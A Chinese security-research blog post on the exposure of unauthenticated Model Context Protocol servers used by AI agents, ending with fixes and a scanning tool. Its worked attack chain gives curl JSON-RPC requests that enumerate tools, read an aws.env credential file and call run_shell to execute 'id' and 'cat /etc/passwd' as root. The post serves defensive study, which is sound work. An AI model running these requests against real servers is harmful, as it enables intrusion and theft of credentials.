---
title: "MCP 暴露面的安全问题"
date: 2026-06-20
draft: false
tags: ["MCP", "安全", "暴露面", "AI Agent"]
categories: ["security-research"]
series: ["AI Agent 安全"]
description: "MCP 的协议设计给攻击者提供了哪些切入点，以及为什么它的暴露面和传统 HTTP API 不是一回事。"
ShowToc: true
TocOpen: true
---

MCP（Model Context Protocol）是 Anthropic 在 2024 年底推出的开放协议，目标是让 LLM 能以标准化方式连接外部工具、数据库和服务。它的增长速度很快：一年内已经有数千个 MCP Server 实现，覆盖从数据库查询到 Kubernetes 操作的各类能力。

但 MCP 的设计起点是"方便接入"，不是"安全部署"。这带来了一些值得关注的暴露面问题。

## MCP 协议是什么

先说清楚协议本身。MCP 基于 JSON-RPC 2.0，定义了 Client 与 Server 之间的通信方式。Server 暴露三类能力：

- **Tools**：LLM 可调用的函数，比如 `run_sql_query`、`deploy_k8s`、`send_email`
- **Resources**：可读取的数据，比如文件内容、数据库记录
- **Prompts**：预定义的提示词模板

传输层有两个版本：

- **Streamable HTTP**（2025-03-26 规范）：单个 HTTP 端点，POST 初始化，支持 SSE 响应流
- **HTTP+SSE legacy**（2024-11-05 规范）：客户端 GET 建立 SSE 连接，再向 POST 端点发请求，通过 SSE 流接收响应

## 暴露面从哪里来

### 1. 没有强制认证

MCP 规范没有规定认证是必须的。规范提到了认证方案，但它是可选的，完全由 Server 实现者自行决定是否启用。

这在实践中造成大量裸奔部署：

```bash
# POST /mcp，不带任何 token 或认证头
# 返回包含工具列表的完整 initialize 响应
POST /mcp HTTP/1.1
Content-Type: application/json

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"probe","version":"1.0"}}}
```

响应可能直接给出：

```json
{
  "result": {
    "protocolVersion": "2025-03-26",
    "serverInfo": {"name": "my-internal-mcp", "version": "1.0"},
    "capabilities": {
      "tools": {},
      "resources": {}
    }
  }
}
```

服务存在，无认证，能力清单已经在里面了。

### 2. 工具列表是公开的能力清单

确认了 no-auth 后，攻击者下一步是 `tools/list`：

```json
{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
```

返回的是工具名、描述和参数 schema。这个列表直接告诉你这个服务后面挂着什么：

| 工具名 | 意味着什么 |
| --- | --- |
| `run_sql_query` | 可以直连数据库 |
| `execute_shell` | 可以在服务器上执行命令 |
| `deploy_to_k8s` | 可以控制 Kubernetes |
| `read_file` / `write_file` | 可以读写文件系统 |
| `send_slack_message` | 可以给 Slack 发消息 |
| `call_aws_api` | 可以调用 AWS |

传统端口扫描扫到开放端口，你知道有个服务在跑，但不知道它能做什么。MCP tools/list 直接把能力边界摆出来。

### 3. resources/list 可能泄露内部数据

`resources/list` 返回 Server 能访问的数据资源列表，包括 URI 和 MIME type：

```json
{
  "resources": [
    {"uri": "file:///etc/config/app.yaml", "mimeType": "text/yaml"},
    {"uri": "db://prod-db/users", "mimeType": "application/json"},
    {"uri": "s3://internal-bucket/keys/", "mimeType": "application/octet-stream"}
  ]
}
```

这些 URI 本身就是信息泄露——它们暴露了内部文件路径、数据库名、S3 bucket 名，甚至可以直接看出 Server 运行在什么环境里。

### 4. Prompts 可能泄露业务逻辑

`prompts/list` 会返回预定义的提示词模板，有时候这些模板包含：

- 系统提示词（system prompt）
- 业务规则
- 内部角色定义
- 调试用的模板（包含内部路径或服务名）

这些在正常使用下是给 LLM 看的，不应该直接暴露给网络。

### 5. 端口和路径的可枚举性

MCP Server 有相对固定的默认端口和路径：

- 常见端口：`8000`、`8080`、`3000`、`5000`
- 常见路径：`/mcp`、`/api/mcp`、`/v1/mcp`、`/sse`、`/mcp/sse`

这些路径在主流框架中是默认值，部署时没有修改。扫描器可以用词典枚举，命中率很高。

### 6. Session ID 的行为差异

一些 MCP Server 实现存在 Session ID 管理问题：

- 两次 initialize 返回相同 Session ID（可能是蜜罐，也可能是有状态实现的 bug）
- Session ID 可猜测（递增整数或弱随机）
- Session 不校验来源 IP，任何人拿到 Session ID 就能接管会话

### 7. SSE Legacy 的路径泄露

HTTP+SSE legacy 传输里，Server 在 SSE 连接建立后会推送一个 endpoint event：

```
data: /messages/?session_id=abc123def456
```

这个 POST endpoint 路径有时包含内部信息：

```
data: /internal/mcp-server/v2/messages/?session_id=...&env=prod&region=us-east-1
```

路径本身就在泄露部署信息。

## 攻击链：从发现到利用

上面说的每个暴露面不是孤立的，它们是攻击链上的连续步骤。完整走一遍：

**Step 1：发现服务**

端口扫描发现 `10.0.12.44:8000` 开着 HTTP。发一个 initialize：

```bash
curl -s -X POST http://10.0.12.44:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}'
```

响应：

```json
{
  "result": {
    "protocolVersion": "2025-03-26",
    "serverInfo": {"name": "internal-ops-mcp", "version": "0.9.2"},
    "capabilities": {"tools": {}, "resources": {}}
  }
}
```

服务存在，没有 401，没有 WWW-Authenticate。继续。

**Step 2：枚举能力**

```bash
curl -s -X POST http://10.0.12.44:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
```

响应：

```json
{
  "result": {
    "tools": [
      {
        "name": "run_shell",
        "description": "Run a shell command on the server",
        "inputSchema": {
          "type": "object",
          "properties": {
            "command": {"type": "string", "description": "Shell command to execute"}
          },
          "required": ["command"]
        }
      },
      {
        "name": "read_file",
        "description": "Read a file from the server filesystem",
        "inputSchema": {
          "type": "object",
          "properties": {"path": {"type": "string"}},
          "required": ["path"]
        }
      },
      {
        "name": "query_db",
        "description": "Run SQL query on production database",
        "inputSchema": {
          "type": "object",
          "properties": {
            "sql": {"type": "string"},
            "db": {"type": "string", "default": "prod_users"}
          },
          "required": ["sql"]
        }
      }
    ]
  }
}
```

不需要逆向任何业务逻辑。三个工具，三条攻击路径，参数 schema 全写在里面。

**Step 3：读资源**

```bash
curl -s -X POST http://10.0.12.44:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":3,"method":"resources/list","params":{}}'
```

响应：

```json
{
  "result": {
    "resources": [
      {"uri": "file:///app/config/database.yaml", "mimeType": "text/yaml"},
      {"uri": "file:///app/config/aws.env", "mimeType": "text/plain"},
      {"uri": "db://prod-db/users", "mimeType": "application/json"}
    ]
  }
}
```

`aws.env`。继续。

**Step 4：读取敏感配置**

```bash
curl -s -X POST http://10.0.12.44:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":4,"method":"resources/read","params":{"uri":"file:///app/config/aws.env"}}'
```

响应：

```json
{
  "result": {
    "contents": [
      {
        "uri": "file:///app/config/aws.env",
        "mimeType": "text/plain",
        "text": "AWS_ACCESS_KEY_ID=AKIA...\nAWS_SECRET_ACCESS_KEY=...\nAWS_DEFAULT_REGION=us-east-1\n"
      }
    ]
  }
}
```

**Step 5：调用工具**

用 `run_shell` 在服务器上执行命令：

```bash
curl -s -X POST http://10.0.12.44:8000/mcp \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"run_shell","arguments":{"command":"id && hostname && cat /etc/passwd | head -5"}}}'
```

响应：

```json
{
  "result": {
    "content": [
      {
        "type": "text",
        "text": "uid=0(root) gid=0(root) groups=0(root)\nprod-mcp-01\nroot:x:0:0:root:/root:/bin/bash\n..."
      }
    ]
  }
}
```

从发现端口到 root shell，五个 JSON-RPC 请求，没有凭证，没有漏洞利用，没有 0day——协议设计本来就是这样工作的，只是没有加锁。

这一条链的前提只有一个：Step 1 里 initialize 没有返回 401。

## 为什么比传统 HTTP API 更危险

传统 REST API 暴露的是"接口"，MCP 暴露的是"能力"。

区别很具体：一个 REST 端点可能是 `POST /v1/data`，攻击者需要研究参数、逆向业务逻辑才能知道能做什么。一个 MCP tools/list 直接返回结构化的能力清单，连参数 schema 都有，相当于服务自己提交了一份攻击面说明书。

另外，MCP 后面接的往往是高权限操作。MCP 的设计初衷是"让 LLM 能做复杂的事情"，所以 Server 后面连着数据库、文件系统、Kubernetes、云账号是正常场景，而不是例外。

## 实际情况

互联网上可以搜到开放的 MCP Server。用 FOFA、Shodan 或 ZoomEye 搜索特定的响应特征（比如 `"protocolVersion"` 和 `"capabilities"` 同时出现在 HTTP 响应里），能找到一些没有认证的实例。

有些是故意公开的（测试用、Demo），有些是误暴露（内网服务被映射到公网，或者云服务器安全组配置不对）。

区分两者需要协议层确认，而不只是端口判断。

## 怎么检查自己的环境

最直接的方式是用 [AgentScan](https://github.com/7anX/AgentScan) 扫一遍内网：

```bash
agentscan scan 10.0.0.0/16 -o results.json
```

它会扫出 MCP Server，并输出：

- 认证状态（no-auth / auth-required）
- 工具列表（如果 no-auth）
- 资源列表
- 蜜罐信号

关于 AgentScan 的具体原理，见《[AgentScan 工作原理：MCP、A2A 与 LLM 指纹识别](/agentscan/agentscan-architecture/)》。

## 修复建议

1. **启用认证**：MCP 规范支持 HTTP 认证头，用 Bearer Token 或 OAuth 2.0 做保护。
2. **最小化工具暴露**：不需要对外暴露的工具不要写进 `tools/list`。
3. **限制访问来源**：内网 MCP Server 不应该能从公网直接访问，用防火墙规则限制来源 IP。
4. **不要在 resource URI 里写敏感路径**：URI 会被枚举。
5. **审查默认端口和路径**：使用非默认路径可以降低被扫描器扫到的概率，但不是根本解决方案。

---

*下一篇：[A2A 暴露面的安全问题](/security-research/a2a-attack-surface/)，讲 Agent Card 设计带来的暴露面问题。*
